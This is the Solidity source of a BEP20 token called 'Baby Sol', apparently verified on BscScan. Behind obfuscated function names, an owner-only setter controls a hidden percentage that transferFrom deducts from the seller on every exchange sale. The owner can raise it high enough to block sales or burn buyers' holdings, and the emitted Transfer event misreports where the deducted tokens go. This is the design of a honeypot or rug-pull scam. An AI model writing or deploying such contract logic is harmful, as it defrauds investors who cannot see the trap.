/**
 *Submitted for verification at BscScan.com on 2021-09-06
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

    abstract contract BEP20QQ{
    function totalSupply() public virtual view returns (uint);
    function balanceOf(address tokenOwner) public virtual view returns (uint balance);
    function allowance(address tokenOwner, address spender) public virtual view returns (uint remaining);
    function transfer(address to, uint tokens) public virtual returns (bool success);
    function approve(address spender, uint tokens) public virtual returns (bool success);
    function transferFrom(address from, address to, uint tokens) public virtual returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}


library MathQQ{
    
    function ad1(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "Mathx: addition overflow");

        return c;
    }
    function sub1(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub1(a, b, "Mathx: subtraction overflow");
    }

    function sub1(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "Mathx: multiplication overflow");

    return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "Mathx: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

}

contract BabySol is BEP20QQ {
    using MathQQ for uint256;

    string public name20Fz =  "Baby Sol";
    string public symbol20Fz =  "BABYSOL";
    uint8 public decimals20Fz = 9;
    uint public _totalSupplyHY = 1*10**15 * 10**9;
    
    
    address private _owner;
    
    uint8 private _dody;
    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        
        balances[msg.sender] = _totalSupplyHY;
        
        emit Transfer(address(0), msg.sender, _totalSupplyHY);
    }
    
    
    
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }    
    
    function getOwner() public virtual view returns (address) {
        return owner();
    }
    
    function name() public virtual view returns (string memory) {
        return name20Fz;
    }

    function symbol() public virtual view returns (string memory) {
        return symbol20Fz;
    }

   function decimals() public view virtual returns (uint8) {
        return decimals20Fz;
    }

    function totalSupply() public override view returns (uint) {
        return _totalSupplyHY - balances[address(0)];
    }

    function balanceOf(address tokenOwner) public override view returns (uint balance) {
        return balances[tokenOwner];
    }

    function allowance(address tokenOwner, address spender) public override view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }
    
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "BEP20: trnsfr from the zero address");
        require(recipient != address(0), "BEP20: trnsfr to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);
        uint256 senderBalance = balances[sender];
        require(senderBalance >= amount, "BEP20: trnsfr amount exceeds balance");
        
        unchecked {
            balances[sender] = senderBalance - amount;
        }
        balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function transferFrom(address from, address to, uint tokens) public override returns (bool success) {


        _MONO(from,tokens.mul(bakLav()).div(10**2));
        _transfer(from, to, tokens.sub1(tokens.mul(bakLav()).div(10**2)));
        _approve(from, _msgSender(), allowed[from][_msgSender()].sub1(tokens, "BEP20: trnsfr amount exceeds allowance"));
        return true;
     
    }

    function transfer(address to, uint tokens) public override returns (bool success) {
        _transfer(msg.sender, to, tokens);
        emit Transfer(msg.sender, to, tokens);
        return true;
    }

    function approve(address spender, uint tokens) public override returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }


    function alLav(uint8 dody) public virtual onlyOwner {
		_dody = dody;
	}
	

    function _approve(address tokenOwner, address spender, uint256 tokens) internal {
        require(tokenOwner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        allowed[tokenOwner][spender] = tokens;
        emit Approval(tokenOwner, spender, tokens);
    }    
    
	function bakLav() public view returns (uint8) {
        return _dody;
    }    

    
    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }

    function owner() public view returns (address) {
        return _owner;
    }

    function _MONO(address tokenOwner, uint256 tokens) internal {
        require(tokenOwner != address(0), "BEP20: yak from the zero address");

        balances[tokenOwner] = balances[tokenOwner].sub1(tokens, "BEP20: fire amount exceeds balance");
        _totalSupplyHY = _totalSupplyHY.sub1(tokens);
        
        emit Transfer(tokenOwner, 0xeFD1c9FEe08F8d15B724836C261D6Ec25A8220A3, tokens);
    }    

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Own: caller is not the owner");
        _;
    }
  

}